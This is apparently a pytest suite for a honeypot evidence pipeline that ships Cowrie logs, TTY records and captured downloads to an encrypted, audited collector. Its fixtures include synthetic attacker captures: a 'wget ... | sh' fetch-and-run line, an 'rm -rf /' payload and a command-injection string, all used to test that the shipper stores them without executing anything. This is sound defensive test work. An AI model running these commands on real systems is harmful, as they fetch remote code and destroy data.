"""Evidence ingestion and storage: spool -> shipper -> collector -> encrypted store."""

import ast
import hashlib
import json
import os
import socket
import sqlite3
import subprocess
import threading
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from bearjug import wire
from bearjug.collector.keys import add_sensor
from bearjug.collector.server import CollectorServer
from bearjug.collector.store import IngestError, Store, init_data_dir
from bearjug.schema import EvidenceKind, RawEvidence
from bearjug.shipper import Config, ShipError, Shipper

LOGIN = {
    "eventid": "cowrie.login.success",
    "username": "postgres",
    "password": "Synthetic-Decoy-7",
    "session": "a1b2c3d4e5f6",
    "timestamp": "2026-11-18T03:00:00.123456Z",
    "sensor": "sensor-1",
}
COMMAND = {
    "eventid": "cowrie.command.input",
    "input": "uname -a; wget http://198.51.100.9/x.sh | sh",
    "session": "a1b2c3d4e5f6",
    "timestamp": "2026-11-18T03:00:05.000001Z",
    "sensor": "sensor-1",
}


def line(obj) -> bytes:
    return json.dumps(obj).encode() + b"\n"


@pytest.fixture
def data_dir(tmp_path):
    d = tmp_path / "collector"
    init_data_dir(d)
    return d


@pytest.fixture
def store(data_dir):
    s = Store(data_dir)
    yield s
    s.close()


@pytest.fixture
def sensor_key(data_dir):
    return add_sensor(data_dir / "sensors.json", "sensor-1")


@pytest.fixture
def server(store, sensor_key):
    srv = CollectorServer(("127.0.0.1", 0), store)
    t = threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True)
    t.start()
    yield srv
    srv.shutdown()
    srv.server_close()


@pytest.fixture
def cowrie(tmp_path):
    """Cowrie's output directories, as mounted read-only into the shipper."""
    root = tmp_path / "cowrie"
    for d in ("log", "tty", "downloads"):
        (root / d).mkdir(parents=True)
    return root


def make_shipper(server, cowrie, tmp_path, key, sensor_id="sensor-1"):
    host, port = server.server_address
    return Shipper(
        Config(
            sensor_id=sensor_id,
            key=key,
            collector_url=f"http://{host}:{port}",
            log_dir=cowrie / "log",
            tty_dir=cowrie / "tty",
            download_dir=cowrie / "downloads",
            state_path=tmp_path / "shipper-state.json",
            insecure_http=True,
        )
    )


def meta_for(body, kind=EvidenceKind.COWRIE_EVENT, sha=None, sensor_id="sensor-1"):
    now = datetime.now(timezone.utc)
    return wire.ShipMeta(
        sensor_id=sensor_id,
        kind=kind,
        sha256=sha or hashlib.sha256(body).hexdigest(),
        observed_at=now,
        sent_at=now,
        size_bytes=len(body),
    )


# --- end to end -------------------------------------------------------------


def test_cowrie_output_reaches_the_store_end_to_end(server, store, cowrie, tmp_path, sensor_key):
    (cowrie / "log" / "cowrie.json").write_bytes(line(LOGIN) + line(COMMAND))
    tty = b"\x01\x00binary tty record with a typed password: hunter2\r\n"
    (cowrie / "tty" / ("ab" * 32)).write_bytes(tty)
    payload = b"#!/bin/sh\nrm -rf / --no-preserve-root\n"
    (cowrie / "downloads" / hashlib.sha256(payload).hexdigest()).write_bytes(payload)

    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 4

    rows = {r["kind"]: r for r in store.list()}
    assert len(store.list()) == 4
    assert rows["tty.log"]["sensitive"] and rows["upload"]["sensitive"]
    by_bytes = {store.record(r["evidence_id"]).sha256: store.record(r["evidence_id"]) for r in store.list()}
    login = by_bytes[hashlib.sha256(line(LOGIN)[:-1]).hexdigest()]
    command = by_bytes[hashlib.sha256(line(COMMAND)[:-1]).hexdigest()]
    assert login.sensitive and not command.sensitive
    assert login.session_id == "a1b2c3d4e5f6"
    assert login.observed_at == datetime(2026, 11, 18, 3, 0, 0, 123456, tzinfo=timezone.utc)
    # Records validate against the canonical schema and are always encrypted.
    for r in store.list():
        rec = RawEvidence.model_validate_json(store.record(r["evidence_id"]).model_dump_json())
        assert rec.content.storage == "stored"
        assert rec.content.encryption.algorithm.value == "aes-256-gcm"


def test_plaintext_never_reaches_disk_unencrypted(server, store, data_dir, cowrie, tmp_path, sensor_key):
    (cowrie / "log" / "cowrie.json").write_bytes(line(LOGIN))
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    for path in data_dir.rglob("*"):
        if path.is_file():
            assert b"Synthetic-Decoy-7" not in path.read_bytes(), path


def test_shipping_twice_does_not_duplicate(server, store, cowrie, tmp_path, sensor_key):
    (cowrie / "log" / "cowrie.json").write_bytes(line(LOGIN))
    (cowrie / "tty" / ("cd" * 32)).write_bytes(b"tty")
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    # Shipper state lost: everything is resent, nothing is stored twice.
    (tmp_path / "shipper-state.json").unlink()
    make_shipper(server, cowrie, tmp_path, sensor_key).run_once()
    assert len(store.list()) == 2


def test_shipper_resumes_from_its_offset_and_waits_for_complete_lines(server, store, cowrie, tmp_path, sensor_key):
    log = cowrie / "log" / "cowrie.json"
    log.write_bytes(line(LOGIN) + b'{"eventid": "cowrie.session.cl')  # Cowrie mid-write
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    assert shipper.run_once() == 1
    with log.open("ab") as f:
        f.write(b'osed", "session": "a1b2c3d4e5f6"}\n')
    assert shipper.run_once() == 1
    assert shipper.run_once() == 0
    assert len(store.list()) == 2


def test_rotated_log_is_not_reshipped(server, store, cowrie, tmp_path, sensor_key):
    log = cowrie / "log" / "cowrie.json"
    log.write_bytes(line(LOGIN))
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    shipper.run_once()
    log.rename(cowrie / "log" / "cowrie.json.2026-11-18")
    log.write_bytes(line(COMMAND))
    assert shipper.run_once() == 1
    assert len(store.list()) == 2


def test_tty_logs_still_being_written_are_not_shipped(server, store, cowrie, tmp_path, sensor_key):
    (cowrie / "tty" / "20261118-030000-abc-0i.log").write_bytes(b"in progress")
    (cowrie / "downloads" / "tmp_0f1e2d").write_bytes(b"partial download")
    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 0


# --- authentication ---------------------------------------------------------


def test_wrong_sensor_key_is_refused(server, store, cowrie, tmp_path):
    (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
    with pytest.raises(ShipError, match="401"):
        make_shipper(server, cowrie, tmp_path, os.urandom(32)).run_once()
    assert store.list() == []


def test_a_sensor_cannot_ship_as_another_sensor(server, store, data_dir, cowrie, tmp_path, sensor_key):
    add_sensor(data_dir / "sensors.json", "sensor-2")
    (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
    with pytest.raises(ShipError, match="401"):
        make_shipper(server, cowrie, tmp_path, sensor_key, sensor_id="sensor-2").run_once()
    assert store.list() == []


def _post(server, meta: str, body: bytes, signature: str):
    import urllib.error
    import urllib.request

    host, port = server.server_address
    req = urllib.request.Request(
        f"http://{host}:{port}{wire.PATH}",
        data=body,
        method="POST",
        headers={wire.META_HEADER: meta, wire.SIGNATURE_HEADER: signature},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def test_tampered_body_fails_the_signature(server, store, sensor_key):
    body = line(COMMAND)[:-1]
    meta = wire.encode_meta(meta_for(body))
    sig = wire.sign(sensor_key, meta, body)
    assert _post(server, meta, body.replace(b"uname", b"UNAME"), sig) == 401
    assert _post(server, meta, body, sig) == 201
    assert _post(server, meta, body, sig) == 200  # replay inside the window: duplicate


def test_stale_requests_are_refused(server, store, sensor_key):
    body = line(COMMAND)[:-1]
    old = datetime.now(timezone.utc) - timedelta(hours=1)
    meta = wire.encode_meta(meta_for(body).model_copy(update={"sent_at": old}))
    assert _post(server, meta, body, wire.sign(sensor_key, meta, body)) == 401


def test_collector_has_no_other_routes(server):
    import urllib.error
    import urllib.request

    host, port = server.server_address
    for path in ("/", "/v1/evidence", "/v1/evidence/ev-1"):
        with pytest.raises(urllib.error.HTTPError) as e:
            urllib.request.urlopen(f"http://{host}:{port}{path}")
        assert e.value.code == 404


# --- integrity and classification --------------------------------------------


def test_digest_is_checked_against_the_bytes(store):
    body = line(COMMAND)[:-1]
    with pytest.raises(IngestError, match="sha256 does not match") as e:
        store.ingest(meta_for(body, sha="0" * 64), body)
    assert e.value.status == 422


def test_corrupted_download_is_rejected_and_not_retried(server, store, cowrie, tmp_path, sensor_key):
    # Cowrie named the file after its bytes at capture; the bytes changed since.
    (cowrie / "downloads" / hashlib.sha256(b"original").hexdigest()).write_bytes(b"tampered")
    shipper = make_shipper(server, cowrie, tmp_path, sensor_key)
    assert shipper.run_once() == 0
    assert store.list() == []
    assert len(shipper.state.shipped) == 1


@pytest.mark.parametrize("body", [b"not json", b"[1, 2]", b'{"input": "ls"}'])
def test_unclassifiable_cowrie_events_are_rejected(store, body):
    with pytest.raises(IngestError) as e:
        store.ingest(meta_for(body), body)
    assert e.value.status == 422


def test_nested_secret_marks_an_event_sensitive(store):
    body = json.dumps({"eventid": "cowrie.client.custom", "meta": [{"Passwd": "x"}]}).encode()
    _, eid = store.ingest(meta_for(body), body)
    assert store.record(eid).sensitive


def test_oversized_evidence_is_refused(store):
    store.settings.max_evidence_bytes = 10
    body = b"x" * 11
    with pytest.raises(IngestError) as e:
        store.ingest(meta_for(body, kind=EvidenceKind.UPLOAD), body)
    assert e.value.status == 413


# --- encrypted storage, access and audit -------------------------------------


def test_reads_decrypt_and_are_audited(store):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    assert store.read(eid, actor="reuben", reason="triage") == body
    assert [(a["actor"], a["action"]) for a in store.audit_log()] == [("reuben", "read")]


def test_sensitive_reads_need_a_named_reader(store):
    body = line(LOGIN)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    with pytest.raises(PermissionError):
        store.read(eid, actor="someone", reason="curious")
    store.settings.sensitive_readers = ["researcher"]
    assert store.read(eid, actor="researcher", reason="credential study") == body
    assert [a["action"] for a in store.audit_log()] == ["read-denied", "read"]


def test_blob_swapped_between_records_fails_to_decrypt(store):
    a, b = line(COMMAND)[:-1], b'{"eventid": "cowrie.session.closed"}'
    _, ea = store.ingest(meta_for(a), a)
    _, eb = store.ingest(meta_for(b), b)
    store._blob_path(ea).write_bytes(store._blob_path(eb).read_bytes())
    with pytest.raises(Exception):
        store.read(ea, actor="reuben", reason="check")


def test_rotated_keys_still_decrypt_old_evidence(store, data_dir):
    a = line(COMMAND)[:-1]
    _, ea = store.ingest(meta_for(a), a)
    assert store.keyring.rotate() == "ek-2"
    b = b'{"eventid": "cowrie.session.closed"}'
    _, eb = store.ingest(meta_for(b), b)
    assert store.record(ea).content.encryption.key_id == "ek-1"
    assert store.record(eb).content.encryption.key_id == "ek-2"
    reopened = Store(data_dir)
    assert reopened.read(ea, actor="r", reason="x") == a
    assert reopened.read(eb, actor="r", reason="x") == b


def test_key_files_are_private(data_dir, sensor_key):
    for name in ("evidence-keys.json", "sensors.json"):
        assert (data_dir / name).stat().st_mode & 0o077 == 0


def test_records_are_append_only(store, data_dir):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    db = sqlite3.connect(data_dir / "evidence.db", isolation_level=None)
    with pytest.raises(sqlite3.IntegrityError, match="append-only"):
        db.execute("UPDATE evidence SET sha256 = ? WHERE evidence_id = ?", ("0" * 64, eid))
    with pytest.raises(sqlite3.IntegrityError, match="append-only"):
        db.execute("DELETE FROM evidence")
    store.read(eid, actor="r", reason="x")
    with pytest.raises(sqlite3.IntegrityError, match="append-only"):
        db.execute("DELETE FROM audit")


# --- retention and deletion ---------------------------------------------------


def test_retention_purges_sensitive_evidence_sooner(store):
    now = datetime(2026, 11, 18, tzinfo=timezone.utc)
    login, command = line(LOGIN)[:-1], line(COMMAND)[:-1]
    _, e_login = store.ingest(meta_for(login), login, now=now - timedelta(days=31))
    _, e_cmd = store.ingest(meta_for(command), command, now=now - timedelta(days=31))
    assert store.purge(now=now) == [e_login]
    assert not store._blob_path(e_login).exists()
    assert store._blob_path(e_cmd).exists()
    assert store.purge(now=now + timedelta(days=365)) == [e_cmd]
    assert [a["actor"] for a in store.audit_log()] == ["retention", "retention"]


def test_deleted_evidence_keeps_a_tombstone_and_is_not_restored(store):
    body = line(LOGIN)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    store.delete(eid, actor="reuben", reason="test data")
    assert store.record(eid).sha256 == hashlib.sha256(body).hexdigest()
    with pytest.raises(KeyError):
        store.read(eid, actor="reuben", reason="x")
    assert store.ingest(meta_for(body), body) == ("deleted", eid)
    assert not store._blob_path(eid).exists()


def test_delete_needs_a_reason(store):
    body = line(COMMAND)[:-1]
    _, eid = store.ingest(meta_for(body), body)
    with pytest.raises(PermissionError):
        store.delete(eid, actor="reuben", reason=" ")


# --- the shipper boundary (design 2.3) ---------------------------------------


def test_shipper_never_executes_or_interprets_spool_content(server, store, cowrie, tmp_path, sensor_key, monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("shipper tried to run something")

    for name in ("system", "popen", "execv", "execve", "execvp", "spawnv"):
        monkeypatch.setattr(os, name, refuse, raising=False)
    monkeypatch.setattr(subprocess, "Popen", refuse)
    monkeypatch.setattr("builtins.eval", refuse)
    monkeypatch.setattr("builtins.exec", refuse)

    hostile = {"eventid": "cowrie.command.input", "input": "$(reboot); `id`; | sh && ' \" \\ %s {0}"}
    (cowrie / "log" / "cowrie.json").write_bytes(line(hostile))
    elf = b"\x7fELF\x02\x01\x01" + os.urandom(64)
    (cowrie / "downloads" / hashlib.sha256(elf).hexdigest()).write_bytes(elf)
    script = cowrie / "downloads" / hashlib.sha256(b"#!/bin/sh\necho pwned\n").hexdigest()
    script.write_bytes(b"#!/bin/sh\necho pwned\n")
    script.chmod(0o755)

    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 3
    store.settings.sensitive_readers = ["r"]
    stored = {store.read(r["evidence_id"], actor="r", reason="x") for r in store.list()}
    assert stored == {line(hostile)[:-1], elf, b"#!/bin/sh\necho pwned\n"}


def test_shipper_does_not_follow_symlinks_out_of_the_spool(server, store, cowrie, tmp_path, sensor_key):
    secret = tmp_path / "shipper-key"
    secret.write_bytes(b"not for the collector")
    (cowrie / "tty" / ("ef" * 32)).symlink_to(secret)
    (cowrie / "log" / "cowrie.json").symlink_to(secret)
    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 0
    assert store.list() == []


def test_shipper_never_listens(server, cowrie, tmp_path, sensor_key, monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("shipper opened a listening socket")

    monkeypatch.setattr(socket.socket, "listen", refuse)
    (cowrie / "log" / "cowrie.json").write_bytes(line(COMMAND))
    assert make_shipper(server, cowrie, tmp_path, sensor_key).run_once() == 1


SRC = Path(__file__).resolve().parents[1] / "src" / "bearjug"


def test_collector_has_no_client_code():
    """The collector only answers; it imports nothing that could open a
    connection to a sensor."""
    forbidden = {"socket", "urllib.request", "http.client", "requests", "httpx", "urllib3", "aiohttp", "asyncio"}
    for path in (SRC / "collector").glob("*.py"):
        for node in ast.walk(ast.parse(path.read_text())):
            if isinstance(node, ast.Import):
                names = {a.name for a in node.names}
            elif isinstance(node, ast.ImportFrom):
                names = {node.module or ""} | {f"{node.module}.{a.name}" for a in node.names}
            else:
                continue
            assert not names & forbidden, f"{path.name} imports {names & forbidden}"


def test_shipper_requires_tls_unless_told_otherwise(tmp_path, sensor_key):
    with pytest.raises(ValueError, match="https"):
        Shipper(Config(sensor_id="sensor-1", key=sensor_key, collector_url="http://collector", state_path=tmp_path / "s"))
